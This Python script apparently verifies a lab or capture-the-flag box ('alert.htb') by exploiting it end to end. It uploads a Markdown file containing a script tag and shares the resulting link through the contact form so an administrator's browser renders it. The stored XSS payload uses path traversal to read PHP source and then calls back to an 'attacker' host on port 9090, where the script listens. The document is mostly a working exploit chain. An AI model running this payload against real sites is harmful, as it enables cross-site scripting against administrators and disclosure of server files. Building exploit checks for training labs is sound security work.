#!/usr/bin/env python3
"""External HTTP-only player checks actual administrator browser behavior."""
import http.server
import os
import re
import threading
import time
import urllib.parse
import urllib.request
import uuid

BASE=os.environ.get("TARGET_URL","http://alert-target:8080").rstrip("/")
arrived=threading.Event()
class Callback(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path=="/browser-proof?ok=1":
            arrived.set()
        self.send_response(204)
        self.end_headers()
    def log_message(self,*_): pass

server=http.server.ThreadingHTTPServer(("0.0.0.0",9090),Callback)
threading.Thread(target=server.serve_forever,daemon=True).start()

def send(path,data=None,headers=None):
    req=urllib.request.Request(BASE+path,data=data,headers=headers or {})
    with urllib.request.urlopen(req,timeout=20) as r:
        return r.status,r.read().decode("utf-8","replace")

print("[1/5] Check ordinary public pages")
_,page=send("/index.php")
assert "Markdown" in page

print("[2/5] Upload active HTML embedded in a Markdown document")
js='<script>fetch("/messages.php?file=../messages.php").then(r=>r.text()).then(t=>{if(t.includes("file_get_contents")){new Image().src="http://attacker:9090/browser-proof?ok=1"}})</script>'
md="# Shared meeting note\n\n"+js
boundary="----alert"+uuid.uuid4().hex
payload=("--"+boundary+"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"note.md\"\r\nContent-Type: text/markdown\r\n\r\n").encode()+md.encode()+("\r\n--"+boundary+"--\r\n").encode()
_,page=send("/visualizer.php",payload,{"Content-Type":"multipart/form-data; boundary="+boundary})
match=re.search(r'/visualizer\.php\?link_share=[a-z0-9]{24}\.md',page)
assert match and "Shared meeting note" in page
share=match.group(0)

print("[3/5] Check saved document can be shared")
_,shared=send(share)
assert "browser-proof" in shared

print("[4/5] Queue shared document through a genuine contact message")
data=urllib.parse.urlencode({"email":"reader@example.com","message":"Please review http://alert.htb"+share}).encode()
send("/contact.php",data,{"Content-Type":"application/x-www-form-urlencoded"})

print("[5/5] Browser must traverse loopback-only message reader to view PHP source and send a non-sensitive proof")
assert arrived.wait(65),"No native Chromium execution / privileged page access observed"
server.shutdown()
print("PASS: independent Markdown upload -> shared XSS -> real Chromium -> localhost-only source read by real traversal")
